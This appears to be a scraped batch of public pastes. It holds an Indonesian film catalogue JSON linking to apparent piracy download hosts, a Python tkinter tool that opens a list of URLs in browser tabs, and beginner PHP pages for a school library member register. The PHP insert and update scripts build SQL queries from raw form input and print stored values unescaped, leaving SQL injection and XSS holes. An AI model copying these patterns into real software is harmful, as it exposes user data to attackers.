      ""imgUrl"": ""https://s4.lk21static.xyz/wp-content/uploads/2024/04/film-kung-fu-panda-4-2024-lk21-d21.jpg"",
      ""videoId"": ""_inKs4eeHiI"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filemoon.sx/download/v02sxuswgcid"",
      ""title"": ""KUNG FU PANDA 4 (2024)"",
      ""inform"": ""10+"",
      ""hashtag"": ""2024 | Action | Adventure | Animation"",
      ""synopsis"": ""Kung Fu Panda 4 (2024) Setelah Po disadap untuk menjadi Pemimpin Spiritual Lembah Damai, dia perlu menemukan dan melatih Prajurit Naga baru, sementara penyihir jahat berencana untuk memanggil kembali semua penjahat utama yang telah dikalahkan Po ke alam roh."",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    },
    {
      ""imgUrl"": ""https://s0.lk21static.xyz/wp-content/uploads/2017/11/film-war-planet-apes-2017.jpg"",
      ""videoId"": ""yDBFrQvfGlQ"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filelions.site/download/uidf6lio110q_n"",
      ""title"": ""WAR FOR THE PLANET OF THE APES (2017)"",
      ""inform"": ""18+"",
      ""hashtag"": ""2017 | Action | Adventure | Drama | Sci-fi | Thriller"",
      ""synopsis"": ""War for the Planet of the Apes (2017) Caesar dan kera-keranya dipaksa terlibat dalam konflik mematikan dengan pasukan manusia yang dipimpin oleh seorang Kolonel yang kejam. Setelah para kera menderita kerugian yang tak terbayangkan, Caesar bergulat dengan naluri gelapnya dan memulai misi mistisnya sendiri untuk membalaskan dendam kaumnya. Saat perjalanan akhirnya mempertemukan mereka, Caesar dan Kolonel diadu satu sama lain dalam pertempuran epik yang akan menentukan nasib spesies mereka dan masa depan planet ini. ??"",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    },
    {
      ""imgUrl"": ""https://s0.lk21static.xyz/wp-content/uploads/2024/05/film-vash-2023-lk21-d21.jpg"",
      ""videoId"": ""DuWOpHkG49s"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filelions.site/download/n5uon6y8zro7_h"",
      ""title"": ""VASH (2023)"",
      ""inform"": ""18+"",
      ""hashtag"": ""2023 | Horror | Mystery | Thriller"",
      ""synopsis"": ""Vash (2023) Atharva, seorang pria keluarga, membawa keluarganya untuk berlibur dan sayangnya terjebak dalam ilmu hitam oleh orang asing bernama Pratap."",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    },
    {
      ""imgUrl"": ""https://s3.lk21static.xyz/wp-content/uploads/2016/01/film-dawn-of-the-planet-of-the-apes-2014.jpg"",
      ""videoId"": ""3sHMCRaS3ao"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filelions.site/download/zc1q7o0iqe5f_n"",
      ""title"": ""DAWN OF THE PLANET OF THE APES (2014)"",
      ""inform"": ""18+"",
      ""hashtag"": ""2014 | Action | Drama | Sci-fi"",
      ""synopsis"": ""Dawn of the Planet of the Apes (2014) Bercerita tentang negara kera yang berkembang secara genetik yang dipimpin oleh Caesar, terancam oleh sekelompok manusia yang selamat dari virus mematikan yang dilepaskan satu dekade sebelumnya. Mereka mencapai perdamaian yang rapuh, namun hal itu tidak bertahan lama, karena kedua belah pihak berada di ambang perang yang akan menentukan siapa yang akan muncul sebagai spesies dominan di Bumi. ??"",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    },
    {
      ""imgUrl"": ""https://s6.lk21static.xyz/wp-content/uploads/2016/05/film-deadpool-2016.jpg"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
      ""urlDownload"": ""https://filelions.site/download/g719s9wq1fu0_n"",
      ""title"": ""Deadpool 2"",
      ""inform"": ""18+"",
      ""hashtag"": ""2016 | Drama | Romance"",
      ""synopsis"": ""Deadpool (2016) Ini adalah kisah asal usul mantan anggota Pasukan Khusus yang berubah menjadi tentara bayaran Wade Wilson, yang setelah menjadi sasaran eksperimen jahat yang membuatnya memiliki kekuatan penyembuhan yang dipercepat, mengadopsi alter ego Deadpool. Berbekal kemampuan barunya dan selera humor yang kelam, Deadpool memburu pria yang hampir menghancurkan hidupnya. ??"",
      ""suggestions"": [
		{
		 ""imgUrl"": ""https://s6.lk21static.xyz/wp-content/uploads/2016/05/film-deadpool-2016.jpg"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2010 | Action | Comedy | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		},
		{
		 ""imgUrl"": ""https://drive.google.com/uc?export=view&id=1Ejunapbyo7fEEK7CtQVj7r5fqg0csVfJ"",
         ""videoId"": ""ONHBaC-pfsk"",
         ""liveStream"": ""https://emturbovid.com/t/kr3cJOlnzXsHu5oSAQwm"",
         ""urlDownload"": ""https://drive.usercontent.google.com/download?id=1QHGYVIGdP5Oa69K74xcFeBxJtFOTvyr-&export=download"",
         ""title"": ""Lemmo"",
         ""hashtag"": ""2024 | Drama | Romance | 18+"",
         ""synopsis"": ""Ada seorang anak ..... akwoakowkoakwo""
		}
	  ]
    }
  ]
}"
2YhzZ5yc,Film (Biram),AhmadXploit,Dart,Thursday 16th of May 2024 12:07:33 AM CDT,"{
  ""films"": [
    {
      ""imgUrl"": ""https://s4.lk21static.xyz/wp-content/uploads/2024/04/film-kung-fu-panda-4-2024-lk21-d21.jpg"",
      ""videoId"": ""_inKs4eeHiI"",
      ""urlDownload"": ""https://filemoon.sx/download/v02sxuswgcid"",
      ""title"": ""KUNG FU PANDA 4 (2024)"",
      ""hashtag"": ""2024 | Action | Adventure | Animation | 10+"",
      ""synopsis"": ""Kung Fu Panda 4 (2024) Setelah Po disadap untuk menjadi Pemimpin Spiritual Lembah Damai, dia perlu menemukan dan melatih Prajurit Naga baru, sementara penyihir jahat berencana untuk memanggil kembali semua penjahat utama yang telah dikalahkan Po ke alam roh.""
    },
    {
      ""imgUrl"": ""https://s0.lk21static.xyz/wp-content/uploads/2017/11/film-war-planet-apes-2017.jpg"",
      ""videoId"": ""yDBFrQvfGlQ"",
      ""urlDownload"": ""https://filelions.site/download/uidf6lio110q_n"",
      ""title"": ""WAR FOR THE PLANET OF THE APES (2017)"",
      ""hashtag"": ""2017 | Action | Adventure | Drama | Sci-fi | Thriller | 18+"",
      ""synopsis"": ""War for the Planet of the Apes (2017) Caesar dan kera-keranya dipaksa terlibat dalam konflik mematikan dengan pasukan manusia yang dipimpin oleh seorang Kolonel yang kejam. Setelah para kera menderita kerugian yang tak terbayangkan, Caesar bergulat dengan naluri gelapnya dan memulai misi mistisnya sendiri untuk membalaskan dendam kaumnya. Saat perjalanan akhirnya mempertemukan mereka, Caesar dan Kolonel diadu satu sama lain dalam pertempuran epik yang akan menentukan nasib spesies mereka dan masa depan planet ini. ??""
    },
    {
      ""imgUrl"": ""https://s0.lk21static.xyz/wp-content/uploads/2024/05/film-vash-2023-lk21-d21.jpg"",
      ""videoId"": ""DuWOpHkG49s"",
      ""urlDownload"": ""https://filelions.site/download/n5uon6y8zro7_h"",
      ""title"": ""VASH (2023)"",
      ""hashtag"": ""2023 | Horror | Mystery | Thriller | 18+"",
      ""synopsis"": ""Vash (2023) Atharva, seorang pria keluarga, membawa keluarganya untuk berlibur dan sayangnya terjebak dalam ilmu hitam oleh orang asing bernama Pratap.""
    },
    {
      ""imgUrl"": ""https://s3.lk21static.xyz/wp-content/uploads/2016/01/film-dawn-of-the-planet-of-the-apes-2014.jpg"",
      ""videoId"": ""3sHMCRaS3ao"",
      ""urlDownload"": ""https://filelions.site/download/zc1q7o0iqe5f_n"",
      ""title"": ""DAWN OF THE PLANET OF THE APES (2014)"",
      ""hashtag"": ""2014 | Action | Drama | Sci-fi | 18+"",
      ""synopsis"": ""Dawn of the Planet of the Apes (2014) Bercerita tentang negara kera yang berkembang secara genetik yang dipimpin oleh Caesar, terancam oleh sekelompok manusia yang selamat dari virus mematikan yang dilepaskan satu dekade sebelumnya. Mereka mencapai perdamaian yang rapuh, namun hal itu tidak bertahan lama, karena kedua belah pihak berada di ambang perang yang akan menentukan siapa yang akan muncul sebagai spesies dominan di Bumi. ??""
    },
    {
      ""imgUrl"": ""https://s6.lk21static.xyz/wp-content/uploads/2016/05/film-deadpool-2016.jpg"",
      ""videoId"": ""ONHBaC-pfsk"",
      ""urlDownload"": ""https://filelions.site/download/g719s9wq1fu0_n"",
      ""title"": ""Deadpool 2"",
      ""hashtag"": ""2016 | Drama | Romance | 18+"",
      ""synopsis"": ""Deadpool (2016) Ini adalah kisah asal usul mantan anggota Pasukan Khusus yang berubah menjadi tentara bayaran Wade Wilson, yang setelah menjadi sasaran eksperimen jahat yang membuatnya memiliki kekuatan penyembuhan yang dipercepat, mengadopsi alter ego Deadpool. Berbekal kemampuan barunya dan selera humor yang kelam, Deadpool memburu pria yang hampir menghancurkan hidupnya. ??""
    }
  ]
}"
m6fpwQ3E,Abre Url´s (Automatização de cópia no 1fichier),MizunoBrasil,Python,Wednesday 15th of May 2024 11:49:40 PM CDT,"# Automatização de cópia de arquivos no 1fichier. O Programa simplesmente abre as url´s inseridas na caixa de texto.

import webbrowser
import threading
import time
import tkinter as tk
from tkinter import scrolledtext, messagebox, Menu

def open_urls():
    urls = text_area.get('1.0', tk.END).strip().split('\n')
    if not urls:
        messagebox.showinfo(""Erro"", ""Por favor, insira pelo menos uma URL."")
        return
    
    def open_urls_in_sequence():
        for url in urls:
            if url:
                webbrowser.open_new_tab(url)
                time.sleep(1)  # Pausa de 1 segundo entre aberturas de abas

    threading.Thread(target=open_urls_in_sequence).start()

def on_right_click(event):
    try:
        # Exibe o menu de contexto na posição do mouse
        context_menu.tk_popup(event.x_root, event.y_root)
    finally:
        # Garante que o menu seja fechado
        context_menu.grab_release()

def paste_action():
    # Função para colar texto na área de texto
    text_area.event_generate(""<<Paste>>"")

def main():
    global text_area, context_menu
    root = tk.Tk()
    root.title(""Abrir URLs - Automação de arquivos do 1fichier"")

    # Configuração da janela maior e mais vertical
    window_width = 500
    window_height = 500
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x_coordinate = int((screen_width / 2) - (window_width / 2))
    y_coordinate = int((screen_height / 2) - (window_height / 2))
    root.geometry(f""{window_width}x{window_height}+{x_coordinate}+{y_coordinate}"")

    # Área de texto maior e mais vertical para inserção de URLs
    text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, height=20)
    text_area.pack(padx=20, pady=10, fill=tk.BOTH, expand=True)
    text_area.bind(""<Button-3>"", on_right_click)

    # Menu de contexto para colar
    context_menu = Menu(root, tearoff=0)
    context_menu.add_command(label=""Colar"", command=paste_action)

    # Botão para abrir URLs
    button_open = tk.Button(root, text=""Abrir URLs"", command=open_urls)
    button_open.pack(pady=20)

    root.mainloop()

if __name__ == ""__main__"":
    main()
"
s2mP8buF,proses-tambah-anggota.php,ali602,PHP,Wednesday 15th of May 2024 09:05:54 PM CDT,"<?php

include(""config.php"");

// cek apakah tombol daftar sudah diklik atau blum?
if(isset($_POST['daftar'])){
	
	// ambil data dari formulir
	$nama = $_POST['nama'];
	$alamat = $_POST['alamat'];
	$jk = $_POST['jenis_kelamin'];
	$agama = $_POST['agama'];
	$sekolah = $_POST['asal_sekolah'];
	
	// buat query
	$sql = ""INSERT INTO anggota_perpus (nama, alamat, jenis_kelamin, agama, asal_sekolah) VALUE ('$nama', '$alamat', '$jk', '$agama', '$sekolah')"";
	$query = mysqli_query($db, $sql);
	
	// apakah query simpan berhasil?
	if( $query ) {
		// kalau berhasil alihkan ke halaman index.php dengan status=sukses
		header('Location: index.php?status=sukses');
	} else {
		// kalau gagal alihkan ke halaman indek.php dengan status=gagal
		header('Location: index.php?status=gagal');
	}
	
	
} else {
	die(""Akses dilarang..."");
}

?>"
XPytXGsE,proses-edit-anggota.php,ali602,PHP,Wednesday 15th of May 2024 09:05:19 PM CDT,"<?php

	include(""config.php"");

	// cek apakah tombol sudah diklik atau blum?
	if(isset($_POST['simpan'])){
		
		// ambil data dari formulir
		$id = $_POST['id_anggota'];
		$nama = $_POST['nama'];
		$alamat = $_POST['alamat'];
		$jk = $_POST['jenis_kelamin'];
		$agama = $_POST['agama'];
		$sekolah = $_POST['asal_sekolah'];
		
		// buat query update
		$sql = ""UPDATE anggota_perpus SET nama='$nama', alamat='$alamat', jenis_kelamin='$jk', agama='$agama', asal_sekolah='$sekolah' WHERE id_anggota=$id"";
		$query = mysqli_query($db, $sql);
		
		// apakah query update berhasil?
		if( $query ) {
			// kalau berhasil alihkan ke halaman list-daftar-anggota.php
			header('Location: list-daftar-anggota.php');
		} else {
			// kalau gagal tampilkan pesan
			die(""Gagal menyimpan perubahan..."");
		}
		
		
	} else {
		die(""Akses dilarang..."");
	}

?>"
x7dcXRdM,list-daftar-anggota.php,ali602,PHP,Wednesday 15th of May 2024 09:04:33 PM CDT,"<?php include(""config.php""); ?>


<!DOCTYPE html>
<html>
<head>
	<title>Pendaftaran Anggota Perpus Baru | SMK Gamelab Indonesia</title>
	<style>
		.anggota {
		  font-family: Arial, Helvetica, sans-serif;
		  border-collapse: collapse;
		  width: 100%;
		}

		.anggota td, .anggota th {
		  border: 1px solid #ddd;
		  padding: 8px;
		}

		.anggota td {
		  padding-top: 12px;
		  padding-bottom: 12px;
		  text-align: center;
		}

		.anggota tr:nth-child(even){background-color: #f2f2f2;}

		.anggota tr:hover {background-color: #ddd;}

		.anggota th {
		  padding-top: 12px;
		  padding-bottom: 12px;
		  text-align: center;
		  background-color: #04AA6D;
		  color: white;
		}
		.fcc-btn1 {
		  background-color:#008CBA;
		  color: white;
		  padding: 5px 15px;
		  border-radius:8px;
		}
		.fcc-btn2 {
		  background-color: #f44336;
		  color: white;
		  padding: 5px 15px;
		  border-radius:8px;
		}

		.fcc-btn3 {
		  background-color: #4CAF50;
		  color: white;
		  padding: 5px 15px;
		  border-radius:8px;
		}
		a {
			text-decoration:none;
		}
	</style>
</head>

<body>
	<header>
		<h1>Daftar Anggota Perpustakaan yang sudah mendaftar</h1>
	</header>
	
	<nav>
		<a class='fcc-btn3' href=""form-daftar-anggota.php"">[+] Tambah Anggota</a>
	</nav>
	
	<br>
	
	<table border=""1"" class=""anggota"">
		<thead>
			<tr>
				<th>No</th>
				<th>Nama Lengkap</th>
				<th>Alamat Lengkap</th>
				<th>Jenis Kelamin</th>
				<th>Agama</th>
				<th>Asal Sekolah</th>
				<th>Tindakan</th>
			</tr>
		</thead>
		<tbody>
			
			<?php
				$sql = ""SELECT * FROM anggota_perpus"";
				$query = mysqli_query($db, $sql);
				
				while($anggota = mysqli_fetch_array($query)){
					echo ""<tr>"";
							
					echo ""<td>"".$anggota['id_anggota'].""</td>"";
					echo ""<td>"".$anggota['nama'].""</td>"";
					echo ""<td>"".$anggota['alamat'].""</td>"";
					echo ""<td>"".$anggota['jenis_kelamin'].""</td>"";
					echo ""<td>"".$anggota['agama'].""</td>"";
					echo ""<td>"".$anggota['asal_sekolah'].""</td>"";
							
					echo ""<td>"";
					echo ""<a class='fcc-btn1' href='form-edit-anggota.php?id_anggota="".$anggota['id_anggota'].""' >Edit</a>    "";
				        // tambahkan kode pada baris <a class='fcc-btn2' >Hapus</a>
					echo ""<a class='fcc-btn2' href='hapus-anggota.php?id_anggota="".$anggota['id_anggota'].""' >Hapus</a>"";
					echo ""</td>"";
							
					echo ""</tr>"";
				}	
			?>
			
		</tbody>
	</table>
	
	<h3>Total: <?php echo mysqli_num_rows($query) ?> Anggota baru</h3>
	
	</body>
</html>"
ggr3TEiX,index.php,ali602,PHP,Wednesday 15th of May 2024 09:03:53 PM CDT,"<!DOCTYPE html>
<html>
<head>
	<title>Pendaftaran Anggota Perpustakaan | SMK Gamelab Indonesia</title>
</head>

<body>
	<header>
		<h3>Pendaftaran Anggota Perpus Baru</h3>
		<h1>SMK Gamelab Indonesia</h1>
	</header>
	
	<h4>Menu</h4>
	<nav>
		<ul>
			<li><a href=""form-daftar-anggota.php"">Daftar Baru</a></li>
            <li><a href=""list-daftar-anggota.php"">List Anggota Perpus</a></li>
		</ul>
	</nav>
	
	
	<?php if(isset($_GET['status'])): ?>
	<p>
		<?php
			if($_GET['status'] == 'sukses'){
				echo ""<div style='border: 1px solid rgb(214,233,198);
                background-color: rgb(223,240,216);color: rgb(70,136,71);'>Pendaftaran anggota baru berhasil!</div>"";
			} else {
				echo ""<div style='border: 1px solid rgb(238,211,215);
                background-color: rgb(242,222,222);color: rgb(185,74,72);'>Pendaftaran gagal!</div>"";
			}
		?>
	</p>
	<?php endif; ?>
	
	</body>
</html>"
